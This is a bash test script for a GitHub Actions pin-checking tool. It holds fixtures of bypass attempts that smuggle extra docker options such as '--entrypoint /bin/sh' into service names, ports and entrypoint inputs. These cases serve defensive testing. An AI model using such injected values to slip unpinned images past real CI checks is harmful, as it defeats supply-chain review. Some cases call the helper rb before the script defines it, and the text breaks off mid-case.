#!/usr/bin/env bash
# proves: REQ-REL-005-AC2, REQ-REL-005-AC3
# Proves .github/agent/bin/check-action-pins.py (row 78): one throwaway repo per case, each with one fixture workflow.
set -euo pipefail
here=$(cd "$(dirname "$0")" && pwd)
work=$(mktemp -d); trap 'rm -rf "$work"' EXIT
pass=0 failn=0
gate="$here/../../workflows/agent-review-gate.yml"
# the vendored pure-Python PyYAML (fixtures/testlib/pyyaml) as `yaml`, so every CI job — with or
# without a PyYAML of its own — runs these cases against the same parser
mkdir -p "$work/pylib"; ln -s "$here/../fixtures/testlib/pyyaml" "$work/pylib/yaml"
export PYTHONPATH="$work/pylib${PYTHONPATH:+:$PYTHONPATH}"
SHA=3d3c42e5aac5ba805825da76410c181273ba90b1
DIG=sha256:b1934ee5f1c509618f2508e6eb47ee0d3520686341fec936f3b79331f9315667

# case_ <name> <expect ok|bad> <workflow text> [setup commands, run in the fixture root]
case_() {
  local name=$1 expect=$2 d="$work/$1"
  mkdir -p "$d/.github/workflows"; printf '%s\n' "$3" > "$d/.github/workflows/w.yml"
  cp "$gate" "$d/.github/workflows/agent-review-gate.yml"   # every tree must carry the pinned gate
  mkdir -p "$d/.github/agent/bin"; : > "$d/.github/agent/bin/auditor-review-gate.py"; : > "$d/.github/agent/bin/check-action-pins.py"; mkdir -p "$d/bin" "$d/.github/agent/tests"; : > "$d/bin/check-file-allowlist.sh"; : > "$d/.github/agent/tests/pin-wiring-test.sh"  # the gate's committed programs
  if [ -n "${4:-}" ]; then (cd "$d" && eval "$4"); fi
  if python3 "$here/../bin/check-action-pins.py" "$d" >/dev/null 2>&1; then got=ok; else got=bad; fi
  if [ "$got" = "$expect" ]; then pass=$((pass+1)); echo "PASS $name → $got"
  else failn=$((failn+1)); echo "FAIL $name → $got (want $expect)"; fi
  # VERBOSE=1: show why each case was judged (the first finding), to prove a red is the intended red
  if [ -n "${VERBOSE:-}" ]; then python3 "$here/../bin/check-action-pins.py" "$d" 2>&1 | head -1 | sed "s#^#     #" || true; fi
}
head='on: push
jobs:
  j:
    runs-on: ubuntu-latest'

# --- the forms that pass
case_ pinned               ok  "$head
    steps:
      - uses: actions/checkout@$SHA # v7.0.1"
case_ pinned-quoted        ok  "$head
    steps:
      - uses: 'actions/checkout@$SHA' # v7.0.1"
case_ pinned-subpath       ok  "$head
    steps:
      - uses: github/codeql-action/init@$SHA # v4.1.0"
case_ remote-reusable      bad "on: push
jobs:
  j:
    uses: octo/repo/.github/workflows/x.yml@$SHA # v1.2.3"
case_ local-reusable       ok  "on: push
jobs:
  j:
    uses: ./.github/workflows/w.yml"
case_ docker-digest        ok  "$head
    steps:
      - uses: docker://alpine@$DIG"
case_ container-digest     ok  "$head
    container: alpine@$DIG
    steps:
      - run: true"
case_ service-digest       ok  "$head
    services:
      db:
        image: postgres@$DIG
    steps:
      - run: true"
case_ with-image-is-data   ok  "$head
    steps:
      - uses: actions/checkout@$SHA # v7.0.1
        with:
          image: ghcr.io/x/y@\${{ env.D }}"

case_ job-named-image      ok  "on: push
jobs:
  image:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@$SHA # v7.0.1"
case_ env-image-is-data    ok  "$head
    env:
      image: alpine:3.20
    steps:
      - run: true"
case_ service-scalar-digest ok "$head
    services:
      db: postgres@$DIG
    steps:
      - run: true"

# --- the handoff's four: all red
case_ tag                  bad "$head
    steps:
      - uses: actions/checkout@v7"
case_ branch               bad "$head
    steps:
      - uses: actions/checkout@main"
case_ short-sha            bad "$head
    steps:
      - uses: actions/checkout@3d3c42e # v7.0.1"
case_ sha-no-comment       bad "$head
    steps:
      - uses: actions/checkout@$SHA"

# --- bypass attempts: all red
case_ uppercase-sha        bad "$head
    steps:
      - uses: actions/checkout@3D3C42E5AAC5BA805825DA76410C181273BA90B1 # v7.0.1"
case_ sha-in-comment-only  bad "$head
    steps:
      - uses: actions/checkout@v7 # $SHA"
case_ comment-not-version  bad "$head
    steps:
      - uses: actions/checkout@$SHA # pinned"
case_ comment-next-line    bad "$head
    steps:
      - uses: actions/checkout@$SHA
        # v7.0.1"
case_ key-case             bad "$head
    steps:
      - Uses: actions/checkout@v7"
case_ key-whitespace       bad "$head
    steps:
      - \"uses \": actions/checkout@v7"
case_ flow-style           bad "$head
    steps: [{uses: actions/checkout@v7}]"
case_ anchor-alias         bad "x-step: &s
  uses: actions/checkout@v7
$head
    steps:
      - *s"
case_ merge-key            bad "x-step: &s
  uses: actions/checkout@v7
$head
    steps:
      - <<: *s"
case_ second-document      bad "$head
    steps:
      - uses: actions/checkout@$SHA # v7.0.1
---
$head
    steps:
      - uses: actions/checkout@v7"
case_ folded-scalar        bad "$head
    steps:
      - uses: >-
          actions/checkout@$SHA"
case_ templated            bad "$head
    steps:
      - uses: \${{ vars.ACTION }}"
case_ matrix-expression    bad "$head
    strategy:
      matrix:
        a: ['actions/checkout@v7']
    steps:
      - uses: \${{ matrix.a }}"
case_ not-a-string         bad "$head
    steps:
      - uses: [actions/checkout@v7]"
case_ docker-tag           bad "$head
    steps:
      - uses: docker://alpine:3.20"
case_ container-tag        bad "$head
    container: alpine:3.20
    steps:
      - run: true"
case_ container-map-tag    bad "$head
    container:
      image: alpine:3.20
    steps:
      - run: true"
case_ service-tag          bad "$head
    services:
      db:
        image: postgres:16
    steps:
      - run: true"
case_ local-escapes        bad "$head
    steps:
      - uses: ./../elsewhere" "mkdir -p ../elsewhere; printf 'runs:\n  using: composite\n  steps: []\n' > ../elsewhere/action.yml"
case_ local-missing        bad "$head
    steps:
      - uses: ./.github/actions/nope"
case_ nested-action-tag    bad "$head
    steps:
      - uses: ./.github/actions/x" "mkdir -p .github/actions/x; printf 'runs:\n  using: composite\n  steps:\n    - uses: actions/checkout@v7\n' > .github/actions/x/action.yml"
case_ action-yml-anywhere  bad "$head
    steps:
      - run: true" "mkdir -p tools/a; printf 'runs:\n  using: composite\n  steps:\n    - uses: actions/checkout@v7\n' > tools/a/action.yaml"
case_ docker-action-file   bad "$head
    steps:
      - run: true" "mkdir -p tools/d; printf 'runs:\n  using: docker\n  image: Dockerfile\n' > tools/d/action.yml"
case_ non-yml-in-workflows bad "$head
    steps:
      - run: true" "cp .github/workflows/w.yml .github/workflows/x.YML.txt"
case_ nested-workflow-dir  bad "$head
    steps:
      - run: true" "mkdir -p .github/workflows/sub; printf 'on: push\njobs:\n  j:\n    runs-on: x\n    steps:\n      - uses: actions/checkout@v7\n' > .github/workflows/sub/y.yml"
case_ unparsable           bad "$head
    steps:
      - uses: actions/checkout@$SHA # v7.0.1
     bad: [indent"


# --- adversarial round 1 (audits/2026-09-30/pins/round1): all red
case_ local-action-refused bad "$head
    steps:
      - uses: ./.github/actions/x" "mkdir -p .github/actions/x; printf 'runs:\n  using: composite\n  steps:\n    - uses: actions/checkout@$SHA # v7.0.1\n' > .github/actions/x/action.yml"
case_ local-action-upper   bad "$head
    steps:
      - uses: ./.github/actions/x" "mkdir -p .github/actions/x; printf 'runs:\n  using: composite\n  steps:\n    - uses: actions/checkout@v7\n' > .github/actions/x/ACTION.YML"
case_ upper-manifest-found bad "$head
    steps:
      - run: true" "mkdir -p tools/a; printf 'runs:\n  using: composite\n  steps:\n    - uses: actions/checkout@v7\n' > tools/a/Action.Yml"
case_ local-workflow-step  bad "$head
    steps:
      - uses: ./.github/workflows/w.yml"
case_ job-named-with-cont  bad "on: push
jobs:
  with:
    runs-on: ubuntu-latest
    container: alpine:3.20
    steps:
      - run: true"
case_ job-named-with-uses  bad "on: push
jobs:
  with:
    uses: octo/repo/.github/workflows/x.yml@main"
case_ job-named-env-cont   bad "on: push
jobs:
  env:
    runs-on: ubuntu-latest
    container: alpine:3.20
    steps:
      - run: true"
case_ service-named-with   bad "$head
    services:
      with:
        image: redis:7
    steps:
      - run: true"
case_ service-scalar-tag   bad "$head
    services:
      db: redis:7
    steps:
      - run: true"
case_ service-expression   bad "$head
    services:
      db: \${{ matrix.svc }}
    steps:
      - run: true"
case_ services-expression  bad "$head
    services: \${{ fromJSON('{\"db\":{\"image\":\"redis:7\"}}') }}
    steps:
      - run: true"
case_ service-no-image     bad "$head
    services:
      db:
        ports: ['5432']
    steps:
      - run: true"
case_ expression-key       bad "$head
    steps:
      - \"\${{ 'uses' }}\": actions/checkout@v7"
case_ expression-key-action bad "$head
    steps:
      - run: true" "mkdir -p tools/a; printf 'runs:\n  using: composite\n  steps:\n    - \"\${{ '\\''uses'\\'' }}\": actions/checkout@v7\n' > tools/a/action.yaml"
case_ comment-in-string    bad "$head
    steps:
      - {uses: actions/checkout@$SHA, name: \"hello # v7.0.1 \"} # v0.0.0"
case_ comment-after-other  bad "$head
    steps:
      - uses: actions/checkout@$SHA
        name: x # v7.0.1"
case_ anchor-only-pinned   bad "$head
    steps:
      - &s uses: actions/checkout@$SHA # v7.0.1"
case_ uses-odd-position    bad "on: push
uses: actions/checkout@v7
jobs:
  j:
    runs-on: ubuntu-latest
    steps:
      - run: true"
case_ symlinked-workflow   bad "$head
    steps:
      - run: true" "printf 'on: push\n' > ../elsewhere-\$\$.yml; ln -s \"\$(cd .. && pwd)/elsewhere-\$\$.yml\" .github/workflows/s.yml"
case_ docker-action-image  bad "$head
    steps:
      - run: true" "mkdir -p tools/d; printf 'runs:\n  using: docker\n  image: docker://alpine:3.20\n' > tools/d/action.yml"


# --- adversarial round 2 (audits/2026-09-30/pins/round2)
case_ qemu-pinned          ok  "$head
    steps:
      - uses: docker/setup-qemu-action@$SHA # v4.4.0
        with:
          image: tonistiigi/binfmt:latest@$DIG"
case_ buildx-pinned        ok  "$head
    steps:
      - uses: docker/setup-buildx-action@$SHA # v4.4.1
        with:
          driver-opts: image=moby/buildkit:buildx-stable-1@$DIG"
case_ buildx-docker-driver ok  "$head
    steps:
      - uses: docker/setup-buildx-action@$SHA # v4.4.1
        with:
          driver: docker"
case_ unicode-nbsp-ref     bad "$head
    steps:
      - uses: \"actions/checkout@$SHA\\u00a0\" # v7.0.1"
case_ trailing-newline-ref bad "$head
    steps:
      - uses: \"actions/checkout@$SHA\\n\" # v7.0.1"
case_ tag-with-fragment    bad "$head
    steps:
      - uses: actions/checkout@$SHA # v7.0.1#not-a-real-tag"
case_ qemu-default-image   bad "$head
    steps:
      - uses: docker/setup-qemu-action@$SHA # v4.4.0"
case_ qemu-tag-image       bad "$head
    steps:
      - uses: docker/setup-qemu-action@$SHA # v4.4.0
        with:
          image: tonistiigi/binfmt:latest"
case_ buildx-default-image bad "$head
    steps:
      - uses: docker/setup-buildx-action@$SHA # v4.4.1"
case_ buildx-tag-image     bad "$head
    steps:
      - uses: docker/setup-buildx-action@$SHA # v4.4.1
        with:
          driver-opts: image=moby/buildkit:buildx-stable-1"
case_ buildx-two-images    bad "$head
    steps:
      - uses: docker/setup-buildx-action@$SHA # v4.4.1
        with:
          driver-opts: image=moby/buildkit@$DIG,image=moby/buildkit:latest"
case_ image-trailing-space bad "$head
    container: \"alpine@$DIG \"
    steps:
      - run: true"

# --- adversarial round 3 (audits/2026-09-30/pins/round3)
case_ buildx-multiline-ok  ok  "$head
    steps:
      - uses: docker/setup-buildx-action@$SHA # v4.4.1
        with:
          driver-opts: |
            network=host
            image=moby/buildkit@$DIG"
case_ qemu-owner-case      bad "$head
    steps:
      - uses: Docker/setup-qemu-action@$SHA # v4.4.0"
case_ buildx-repo-case     bad "$head
    steps:
      - uses: DOCKER/Setup-Buildx-Action@$SHA # v4.4.1"
case_ qemu-input-space     bad "$head
    steps:
      - uses: docker/setup-qemu-action@$SHA # v4.4.0
        with:
          \"image \": tonistiigi/binfmt@$DIG"
case_ buildx-driver-space  bad "$head
    steps:
      - uses: docker/setup-buildx-action@$SHA # v4.4.1
        with:
          \"driver \": docker"
case_ buildx-env-decoy     bad "$head
    steps:
      - uses: docker/setup-buildx-action@$SHA # v4.4.1
        with:
          driver-opts: env.NOTE=decoy image=moby/buildkit@$DIG"
case_ buildx-append        bad "$head
    steps:
      - uses: docker/setup-buildx-action@$SHA # v4.4.1
        with:
          driver-opts: image=moby/buildkit@$DIG
          append: |
            - name: n0
              driver-opts:
                - image=moby/buildkit:latest"
case_ qemu-input-twice     bad "$head
    steps:
      - uses: docker/setup-qemu-action@$SHA # v4.4.0
        with:
          image: tonistiigi/binfmt@$DIG
          IMAGE: tonistiigi/binfmt:latest"

# --- adversarial round 4 (audits/2026-09-30/pins/round4)
case_ buildx-csv-quoted-ok ok  "$head
    steps:
      - uses: docker/setup-buildx-action@$SHA # v4.4.1
        with:
          driver-opts: network=host,\"image=moby/buildkit@$DIG\""
case_ buildx-csv-override  bad "$head
    steps:
      - uses: docker/setup-buildx-action@$SHA # v4.4.1
        with:
          driver-opts: |
            image=moby/buildkit@$DIG
            network=host,image=moby/buildkit:latest"
case_ buildx-csv-upper     bad "$head
    steps:
      - uses: docker/setup-buildx-action@$SHA # v4.4.1
        with:
          driver-opts: image=moby/buildkit@$DIG,IMAGE=moby/buildkit:latest"
case_ buildx-csv-broken    bad "$head
    steps:
      - uses: docker/setup-buildx-action@$SHA # v4.4.1
        with:
          driver-opts: '\"image=moby/buildkit@$DIG'"

# --- adversarial round 5 (audits/2026-09-30/pins/round5)
case_ kind-default-ok      ok  "$head
    steps:
      - uses: helm/kind-action@$SHA # v1.15.0
        with:
          cluster_name: x
          registry: 'false'"
case_ kind-pinned-ok       ok  "$head
    steps:
      - uses: helm/kind-action@$SHA # v1.15.0
        with:
          node_image: kindest/node@$DIG
          registry: 'true'
          registry_image: registry@$DIG"
case_ kind-node-tag        bad "$head
    steps:
      - uses: Helm/Kind-Action@$SHA # v1.15.0
        with:
          node_image: kindest/node:v1.33.0"
case_ kind-registry-default bad "$head
    steps:
      - uses: helm/kind-action@$SHA # v1.15.0
        with:
          registry: 'true'"
case_ kind-config          bad "$head
    steps:
      - uses: helm/kind-action@$SHA # v1.15.0
        with:
          config: kind.yaml"
case_ kind-cloud-provider  bad "$head
    steps:
      - uses: helm/kind-action@$SHA # v1.15.0
        with:
          cloud_provider: 'true'"

# --- adversarial round 6 (audits/2026-09-30/pins/round6)
case_ kind-node-collision  bad "$head
    steps:
      - uses: helm/kind-action@$SHA # v1.15.0
        with:
          node_image: kindest/node@$DIG
          \"node image\": kindest/node:v1.33.0"
case_ qemu-image-collision bad "$head
    steps:
      - uses: docker/setup-qemu-action@$SHA # v4.4.0
        with:
          image: tonistiigi/binfmt@$DIG
          \"Image\": tonistiigi/binfmt:latest"
case_ buildx-kubernetes    bad "$head
    steps:
      - uses: docker/setup-buildx-action@$SHA # v4.4.1
        with:
          driver: kubernetes
          driver-opts: |
            image=moby/buildkit@$DIG
            qemu.install=true"
case_ buildx-container-ok  ok  "$head
    steps:
      - uses: docker/setup-buildx-action@$SHA # v4.4.1
        with:
          driver: docker-container
          driver-opts: image=moby/buildkit@$DIG"

# --- adversarial round 7 (audits/2026-09-30/pins/round7): anything not positively classified fails
case_ buildx-unicode-input bad "$head
    steps:
      - uses: docker/setup-buildx-action@$SHA # v4.4.1
        with:
          driver-opts: image=moby/buildkit@$DIG
          driver-optſ: image=moby/buildkit:latest"
case_ buildx-endpoint      bad "$head
    steps:
      - uses: docker/setup-buildx-action@$SHA # v4.4.1
        with:
          driver-opts: image=moby/buildkit@$DIG
          endpoint: --driver-opt=image=moby/buildkit:latest"
case_ qemu-with-expression bad "$head
    steps:
      - uses: docker/setup-qemu-action@$SHA # v4.4.0
        with: \${{ fromJSON(vars.X) }}"
case_ service-options      bad "$head
    services:
      db:
        image: alpine@$DIG
        options: --entrypoint /bin/sh alpine:latest
    steps:
      - run: true"
case_ container-options    bad "$head
    container:
      image: alpine@$DIG
      options: --cpus 1
    steps:
      - run: true"

# --- adversarial round 8 (audits/2026-09-30/pins/round8): only positively classified shapes pass
case_ container-env-ok     ok  "$head
    container:
      image: alpine@$DIG
      env:
        FOO: bar
      credentials:
        username: u
        password: p
    steps:
      - run: true"
case_ service-ports        bad "$head
    services:
      db:
        image: alpine@$DIG
        ports:
          - '8080:80 --entrypoint /bin/sh alpine:latest'
    steps:
      - run: true"
case_ container-ports      bad "$head
    container:
      image: alpine@$DIG
      ports: ['80']
    steps:
      - run: true"
case_ container-volumes    bad "$head
    container:
      image: alpine@$DIG
      volumes: ['/x:/y']
    steps:
      - run: true"
case_ container-env-name   bad "$head
    container:
      image: alpine@$DIG
      env:
        'A B': x
    steps:
      - run: true"
case_ docker-entrypoint    bad "$head
    steps:
      - uses: docker://alpine@$DIG
        with:
          entrypoint: '/bin/echo\" alpine:latest \"x'"
case_ docker-args          bad "$head
    steps:
      - uses: docker://alpine@$DIG
        with:
          args: x"
case_ docker-plain-input   ok  "$head
    steps:
      - uses: docker://alpine@$DIG
        with:
          some_input: x"
case_ unclassified-action  bad "$head
    steps:
      - uses: addnab/docker-run-action@$SHA # v3
        with:
          image: alpine:latest"

# --- adversarial round 9 (audits/2026-09-30/pins/round9)
case_ docker-action-entrypoint bad "$head
    steps:
      - uses: ossf/scorecard-action@$SHA # v2.4.4
        with:
          results_file: r.sarif
          entrypoint: '/bin/echo\" alpine:latest \"'"
# advisor 0140, Codex r2 B1: the composite ossf/scorecard-action wrapper is retired — refused outright, by name,
# whatever its digest/comment; only the direct docker://...@sha256 executor form is accepted
case_ scorecard-composite-retired bad "$head
    steps:
      - uses: ossf/scorecard-action@$SHA # v2.4.4
        with:
          results_file: r.sarif"
case_ scorecard-digest-direct-ok  ok  "$head
    steps:
      - uses: docker://ghcr.io/ossf/scorecard-action@$DIG # v2.4.4
        with:
          results_file: r.sarif
          results_format: sarif"
case_ gate-edited          bad "$head
    steps:
      - run: true" "sed -i.bak 's/--verify-tags --git/--git/' .github/workflows/agent-review-gate.yml && rm .github/workflows/*.bak"
case_ gate-missing         bad "$head
    steps:
      - run: true" "rm .github/workflows/agent-review-gate.yml"
case_ gate-pin-bumped-ok   ok  "$head
    steps:
      - run: true" "sed -i.bak -E 's/@[0-9a-f]{40} # v7.0.1/@$SHA # v7.0.2/' .github/workflows/agent-review-gate.yml && rm .github/workflows/*.bak"

# --- adversarial round 10 (audits/2026-09-30/pins/round10)
case_ action-path-traversal bad "$head
    steps:
      - uses: actions/checkout/../../../docker/setup-qemu-action/$SHA@$SHA # v7.0.1
        with:
          image: tonistiigi/binfmt:latest"
case_ service-name-inject  bad "$head
    services:
      'db --entrypoint /bin/sh alpine:latest --':
        image: alpine@$DIG
    steps:
      - run: true"

# --- the gate's mode: a commit read as git objects (--git), never checked out
gitcase() {
  local name=$1 expect=$2 d="$work/git-$1"
  mkdir -p "$d/.github/workflows"; printf '%s\n' "$3" > "$d/.github/workflows/w.yml"
  cp "$gate" "$d/.github/workflows/agent-review-gate.yml"
  mkdir -p "$d/.github/agent/bin"; : > "$d/.github/agent/bin/auditor-review-gate.py"; : > "$d/.github/agent/bin/check-action-pins.py"; mkdir -p "$d/bin" "$d/.github/agent/tests"; : > "$d/bin/check-file-allowlist.sh"; : > "$d/.github/agent/tests/pin-wiring-test.sh"
  (cd "$d" && eval "${4:-true}" && git init -q && git add -A && git -c user.name=t -c user.email=t@t commit -qm t)
  if (cd "$d" && python3 "$here/../bin/check-action-pins.py" --git HEAD >/dev/null 2>&1); then got=ok; else got=bad; fi
  if [ "$got" = "$expect" ]; then pass=$((pass+1)); echo "PASS git-$name → $got"
  else failn=$((failn+1)); echo "FAIL git-$name → $got (want $expect)"; fi
}
gitcase pinned   ok  "$head
    steps:
      - uses: actions/checkout@$SHA # v7.0.1"
gitcase tag      bad "$head
    steps:
      - uses: actions/checkout@v7"
gitcase symlink  bad "$head
    steps:
      - run: true" "ln -s w.yml .github/workflows/s.yml"


# --- images a run: script names (handoff 0068; owner Sep 30, handoff 0023: "no exceptions, anywhere"; every finding
#     a fix or a documented exclusion with a reason). A LITERAL image a script runs or pulls must be a digest; an image
#     through a shell variable stays with the review pass; a local name the same job made is our own bytes.
r() { printf '%s\n    steps:\n      - run: %s' "$head" "$1"; }
case_ run-literal-tag          bad "$(r 'docker run --rm alpine:latest true')"
case_ run-bare-name            bad "$(r 'docker run alpine true')"
case_ run-registry-tag         bad "$(r 'docker pull ghcr.io/x/y:1.0')"
case_ run-flags-first          bad "$(r 'docker run -d --name x -p 127.0.0.1:1:2 -e A=b --entrypoint /bin/sh alpine -c true')"
case_ run-flag-equals          bad "$(r 'docker run --name=x --platform=linux/arm64 alpine')"
case_ run-sudo-env             bad "$(r 'FOO=1 sudo docker pull busybox')"
case_ run-chained              bad "$(r 'true && docker run alpine')"
case_ run-subshell             bad "$(r 'x=$(docker run alpine cat /etc/os-release)')"
case_ run-container-verb       bad "$(r 'docker container run alpine')"
case_ run-image-verb           bad "$(r 'docker image pull alpine')"
case_ run-create               bad "$(r 'docker create alpine')"
case_ run-continued            bad "$head
    steps:
      - run: |
          docker run \\
            --rm alpine:3 true"
case_ run-skopeo-src           bad "$(r 'skopeo copy docker://alpine:3 oci-archive:/tmp/a.oci')"
case_ run-crane-src            bad "$(r 'crane copy alpine:3 ghcr.io/x/y:t')"
case_ run-composite            bad "$head
    steps:
      - uses: ./.github/actions/x" "mkdir -p .github/actions/x; printf 'runs:\n  using: composite\n  steps:\n    - run: docker run alpine\n      shell: bash\n' > .github/actions/x/action.yml"
case_ run-digest               ok  "$(r 'docker run --rm alpine@sha256:b1934ee5f1c509618f2508e6eb47ee0d3520686341fec936f3b79331f9315667 true')"
case_ run-variable             ok  "$(r 'docker run --rm "$IMG" true')"
case_ run-braced-variable      ok  "$(r 'docker run -d --name x "${repo}@${d}"')"
case_ run-variable-options     ok  "$(r 'docker run -d $authargs -p 1:2 "$ref"')"
case_ run-local-tag-localtrust-removed-bad bad  "$head
    steps:
      - run: docker tag \"\$src\" fa-production
      - run: docker run --rm fa-production"
case_ run-local-build          ok  "$(rb 'docker build -t localimg .
          docker run localimg')" "printf 'FROM alpine@sha256:b1934ee5f1c509618f2508e6eb47ee0d3520686341fec936f3b79331f9315667\\n' > Dockerfile"
case_ run-local-skopeo         bad "$(r 'skopeo copy oci-archive:/tmp/a.oci docker-daemon:fa-debug:latest && docker run fa-debug:latest')"
case_ run-comment              ok  "$(r 'true # docker run alpine')"
case_ run-echo                 ok  "$(r 'echo docker run alpine')"
case_ run-crane-digest-only    ok  "$(r 'crane digest ghcr.io/x/y:1.0')"
case_ run-skopeo-push-dst      ok  "$(r 'skopeo copy oci-archive:/tmp/a.oci docker://ghcr.io/x/y:t')"
case_ run-if                   bad "$(r 'if docker run alpine true; then :; fi')"
case_ run-negated              bad "$(r '! docker run alpine')"
case_ run-loop-body            bad "$(r 'for x in 1; do docker run alpine; done')"
case_ run-timeout              bad "$(r 'timeout 30 docker run alpine')"
case_ run-env-wrapper          bad "$(r 'env A=b nohup docker pull alpine')"
case_ run-xargs                bad "$(r 'echo x | xargs docker run alpine')"
# Codex #164 adversarial r1 C10: a template vouches only for the words of its literal for-list
case_ run-local-template-localtrust-removed-bad bad  "$head
    steps:
      - run: for v in production debug; do docker tag \"\$src\" \"fa-\${v}\"; done
      - run: docker run --rm fa-production"
case_ run-local-template-other bad "$head
    steps:
      - run: for v in a b; do docker tag \"\$src\" \"fa-\${v}\"; done
      - run: docker run --rm fa-production"
case_ run-template-too-wide    bad "$head
    steps:
      - run: docker tag \"\$src\" \"\${v}\"
      - run: docker run --rm alpine"
case_ run-printf               ok  "$(r 'printf "%s\\n" "docker run alpine"; echo docker pull alpine')"
case_ run-other-job-local      bad "$head
    steps:
      - run: docker tag \"\$src\" fa-production
  k:
    runs-on: ubuntu-latest
    steps:
      - run: docker run fa-production"

rb() { printf '%s\n    steps:\n      - run: |\n          %s' "$head" "$1"; }   # block scalar: quotes and ": " stay shell text
# --- package installs a run: script makes (handoff 0070; owner Sep 30, handoff 0023). A Python install is pinned only
#     when every package comes from a -r file pip checks with --require-hashes; pipx / uv tool / uvx cannot take hashes;
#     npm, gem, yarn and pnpm installs are flagged too (none in the workflows today; a future one must not pass silently).
case_ pkg-pip-bare             bad "$(r 'pip install requests')"
case_ pkg-pip3-version         bad "$(r 'pip3 install requests==2.0')"
case_ pkg-global-flag          bad "$(r 'pip --no-cache-dir install requests')"
case_ pkg-python-m             bad "$(r 'python3 -m pip install requests')"
case_ pkg-continued            bad "$head
    steps:
      - run: |
          python3 -m pip \\
            install --quiet requests"
case_ pkg-venv-path            bad "$(rb '"$VENV/bin/pip" install requests')"
case_ pkg-hashes-but-spec      bad "$(r 'pip install --require-hashes -r req.txt requests')"
case_ pkg-r-without-hashes     bad "$(r 'pip install -r req.txt')"
case_ pkg-editable             bad "$(r 'pip install --require-hashes -e .')"
case_ pkg-pipx-install         bad "$(r 'pipx install black')"
case_ pkg-pipx-run             bad "$(r 'pipx run black --version')"
case_ pkg-uv-pip               bad "$(r 'uv pip install requests')"
case_ pkg-uv-tool              bad "$(r 'uv tool install ruff')"
case_ pkg-uvx                  bad "$(r 'uvx ruff check')"
case_ pkg-timeout              bad "$(r 'timeout 60 pip install requests')"
case_ pkg-npm                  bad "$(r 'npm install left-pad')"
case_ pkg-npm-ci               bad "$(r 'npm ci')"
case_ pkg-gem                  bad "$(r 'gem install rake')"
case_ pkg-yarn                 bad "$(r 'yarn add left-pad')"
case_ pkg-bash-c               bad "$(rb 'bash -c "pip install requests"')"
case_ pkg-eval                 bad "$(rb 'eval "pip install requests"')"
case_ img-bash-c               bad "$(rb 'sh -c "docker run alpine"')"
case_ pkg-hashed-file          ok  "$(rb 'python3 -m pip install --quiet --require-hashes --only-binary=:all: -r .github/agent/test-requirements.txt')" "mkdir -p .github/agent; printf 'x==1 --hash=sha256:00\\n' > .github/agent/test-requirements.txt"
case_ pkg-hashed-venv          ok  "$(rb '"$RUNNER_TEMP/v/bin/pip" install --quiet --require-hashes -r r.txt')" "printf 'x==1 --hash=sha256:00\\n' > r.txt"
case_ pkg-hashed-stdin         ok  "$head
    steps:
      - run: |
          python3 -m pip install --quiet --require-hashes --only-binary=:all: -r /dev/stdin <<'REQ'
          pyyaml==6.0.2 --hash=sha256:80bab7bfc629882493af4aa31a4cfa43a4c57c83813253626916b8c7ada83476
          REQ"
case_ pkg-dry-run              ok  "$(rb 'python3 -m pip install --dry-run --ignore-installed --require-hashes --target /tmp/x -r r.txt')" "printf 'x==1 --hash=sha256:00\\n' > r.txt"
case_ pkg-version-query        ok  "$(r 'pip --version; python3 -m pip --version; python3 bin/x.py install')" "mkdir -p bin; : > bin/x.py"
case_ pkg-echo                 ok  "$(r 'echo pip install requests')"

# --- Sonnet #164 r1's eight bypasses (B1-B8), each a red case; the fixes keep our own forms green
case_ b1-abs-path              bad "$(r '/usr/bin/docker run alpine:latest')"
case_ b2-global-host           bad "$(r 'docker --host unix:///var/run/docker.sock run alpine:latest')"
case_ b2-global-debug          bad "$(r 'docker -D run alpine:latest')"
case_ b2-global-unknown        bad "$(r 'docker --frobnicate run alpine@sha256:b1934ee5f1c509618f2508e6eb47ee0d3520686341fec936f3b79331f9315667')"
case_ b2-global-host-refused  bad "$(r 'docker -H unix:///x --tls run --rm alpine@sha256:b1934ee5f1c509618f2508e6eb47ee0d3520686341fec936f3b79331f9315667 true')"
case_ b3-eval                  bad "$(rb 'eval "docker run alpine:latest"')"
case_ b4-unknown-flag          bad "$(r 'docker run --quiet-pull alpine:latest')"
case_ b4-unknown-short         bad "$(r 'docker run -Z alpine:latest')"
case_ b4-known-forms           bad "$(r 'docker run -dit -p8080:80 -eA=b --sig-proxy=false --platform=linux/arm64 -v /a:/b alpine:3')"
case_ b4-known-forms-pinned    ok  "$(r 'docker run -dit -p8080:80 -eA=b --sig-proxy=false --platform=linux/arm64 -v /a:/b alpine@sha256:b1934ee5f1c509618f2508e6eb47ee0d3520686341fec936f3b79331f9315667')"
case_ b5-compose               bad "$(r 'docker compose up -d')"
case_ b5-docker-compose        bad "$(r 'docker-compose up -d')"
case_ b5-bake                  bad "$(r 'docker buildx bake')"
case_ b6-build-unpinned        bad "$(r 'docker build -t myapp .')" "printf 'FROM alpine:latest\\n' > Dockerfile"
case_ b6-build-pinned-localtrust-removed-bad bad  "$(rb 'docker build -t myapp .
          docker run myapp')" "printf 'FROM alpine@sha256:b1934ee5f1c509618f2508e6eb47ee0d3520686341fec936f3b79331f9315667 AS b\\nFROM b\\nFROM scratch\\n' > Dockerfile"
case_ b6-build-stdin           bad "$(r 'docker build -t x - < Dockerfile')" "printf 'FROM alpine@sha256:b1934ee5f1c509618f2508e6eb47ee0d3520686341fec936f3b79331f9315667\\n' > Dockerfile"
case_ b6-buildx-stdin-file     bad "$(r 'docker buildx build -f - .')"
case_ b6-generated             bad "$(rb 'printf "FROM alpine:latest\\n" > Dockerfile.gen && docker build -f Dockerfile.gen .')"
case_ b6-template-pinned       ok  "$(rb 'docker buildx build -f "Dockerfile.${v}" .')" "mkdir -p build; printf 'FROM alpine@sha256:b1934ee5f1c509618f2508e6eb47ee0d3520686341fec936f3b79331f9315667\\n' > build/Dockerfile.a; printf 'FROM busybox@sha256:b1934ee5f1c509618f2508e6eb47ee0d3520686341fec936f3b79331f9315667\\n' > build/Dockerfile.b"
case_ b6-template-one-bad      bad "$(rb 'docker buildx build -f "Dockerfile.${v}" .')" "mkdir -p build; printf 'FROM alpine@sha256:b1934ee5f1c509618f2508e6eb47ee0d3520686341fec936f3b79331f9315667\\n' > build/Dockerfile.a; printf 'FROM busybox:1\\n' > build/Dockerfile.b"
case_ b6-variable-from         bad "$(r 'docker build .')" "printf 'ARG B=alpine\\nFROM \${B}\\n' > Dockerfile"
case_ b7-short-prefix          bad "$head
    steps:
      - run: docker tag \"\$src\" \"al\${v}\"
      - run: docker run alpine true"
case_ b7-decoy-after           bad "$head
    steps:
      - run: docker run --rm alpine:latest true
